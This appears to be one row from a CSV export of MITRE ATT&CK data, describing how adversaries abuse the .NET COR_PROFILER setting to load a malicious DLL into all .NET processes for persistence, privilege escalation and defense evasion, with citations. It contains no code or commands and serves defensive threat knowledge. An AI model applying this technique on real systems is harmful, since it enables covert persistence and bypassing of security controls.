Adversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)) if the victim .NET process executes at a higher permission level, as well as to hook and impair defenses provided by .NET processes.(Citation: RedCanary Mockingbird May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation: Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation: subTee .NET Profilers May 2017)",Windows,FALSE,FALSE,2020-06-24T22:30:55Z
